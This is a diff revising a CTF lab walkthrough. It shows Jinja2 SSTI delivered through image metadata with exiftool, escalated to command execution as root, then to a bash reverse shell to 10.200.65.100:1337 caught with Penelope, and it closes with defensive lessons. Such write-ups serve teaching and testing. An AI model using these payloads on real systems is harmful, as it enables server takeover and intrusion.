@@ -153,7 +153,7 @@ We upload the modified image and preview it. Our input is reflected on the page 
 
 *Reflected input: 0xB1rd rendered in the Copyright / Artist metadata field*
 
-We have confirmed reflected input through image metadata. With reflected input, we consider attack paths like Cross-Site Scripting (XSS) and Server-Side Template Injection (SSTI). Since we already have admin access on the web application, XSS does not move us forward. Our next objective is a foothold on the server itself, and SSTI can get us there. This is a Flask application, so the templating engine is almost certainly Jinja2. We use [HackTricks](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) as a reference for Jinja2 SSTI payloads and start with a basic arithmetic test. If the page renders `49` instead of the literal string, SSTI is confirmed.
+With reflected input confirmed, we consider attack paths like Cross-Site Scripting (XSS) and Server-Side Template Injection (SSTI). Since we already have admin access on the web application, XSS does not move us forward. Our next objective is a foothold on the server itself, and SSTI can get us there. This is a Flask application, so the templating engine is almost certainly Jinja2. We start with a basic arithmetic test. If the page renders `49` instead of the literal string, SSTI is confirmed.
 
 ```
 exiftool -Artist="{{7*7}}" image.png
@@ -163,9 +163,9 @@ We upload the image and click `Preview Current Logo`. The metadata field display
 
 ![SSTI confirmation](images/ssti-confirmed.png)
 
-*SSTI confirmed: Jinja2 expression {{7*7}} rendered as 49*
+*SSTI confirmed: Jinja2 expression {{7\*7}} rendered as 49*
 
-SSTI is confirmed. Now we escalate to remote code execution. Jinja2 does not hand us `os` directly, so the payload walks out to it: `self.__init__` gets us a Python method, `__globals__` exposes the variables that method was defined alongside, and `__builtins__` inside those is Python's built-in namespace. From there `__import__` pulls in `os`, `popen()` runs our command, and `read()` returns the output into the page.
+SSTI is confirmed. Now we escalate to remote code execution. Jinja2 does not expose `os` directly, so the payload chains attribute lookups out to Python's built-in namespace, imports `os` from there, and runs a command with the output returned into the page.
 
 ```
 exiftool -Artist="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}" image.png
@@ -179,13 +179,13 @@ We upload, preview, and the metadata field displays `uid=0(root) gid=0(root) gro
 
 ## Shell as root (root.txt)
 
-With confirmed RCE as root, we craft a reverse shell payload and embed it in the image metadata. We catch the shell with [Penelope](https://github.com/brightio/penelope), which handles the shell upgrade automatically.
+With confirmed RCE as root, we craft a reverse shell payload and embed it in the image metadata. We catch the shell with Penelope, which handles the shell upgrade automatically.
 
 ```
 exiftool -Artist="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \"bash -i >& /dev/tcp/10.200.65.100/1337 0>&1\"').read() }}" image.png
 ```
 
-With the image prepared, we start our Penelope listener.
+Now we start our Penelope listener.
 
 ```
 penelope -p 1337
@@ -205,8 +205,8 @@ We confirm with `id` that we are root and grab the final flag from `/root/root.t
 
 ## Final Thoughts
 
-Verbose is a clean and well-paced easy lab that covers several important web application security fundamentals. The chain from open registration to root moves fast, and the MFA bypass through the same leaky API endpoint is a nice detail. The SSTI exploitation path through image metadata was a creative attack surface that I enjoyed working through.
+Every step in Verbose is an application logic failure rather than a memory safety bug. An API returns more than the page asks for, the MFA code lands in that same response a moment later, and a template engine renders metadata pulled straight out of an uploaded file. Image metadata as an SSTI entry point was new to me, and I got there by noticing that the `Copyright / Artist` field came back rendered instead of escaped.
 
-The core issue is the `/api/users/all` endpoint returning sensitive data with no access controls. API endpoints should enforce role-based authorization, never return plaintext passwords, and never expose MFA codes in responses. On the SSTI side, user-controlled input passed into a template engine needs to be sanitized or rendered safely, and image metadata should be treated as untrusted input before being displayed on a page. The application also runs as root, so SSTI immediately granted full system access with no privilege escalation required. Web applications should always run under a least-privilege service account to limit the blast radius of any code execution vulnerability.
+The core issue is the `/api/users/all` endpoint returning sensitive data with no access controls. API endpoints should enforce role-based authorization, never return plaintext passwords, and never expose MFA codes in responses. On the SSTI side, user-controlled input passed into a template engine needs to be sanitized or rendered safely, and image metadata should be treated as untrusted input before being displayed on a page. The application also runs as root, so SSTI immediately granted full system access with no privilege escalation required. Web applications should always run under a least-privilege service account so that a template injection bug costs an attacker a low-privilege foothold instead of the whole host.
 
 — 0xB1rd
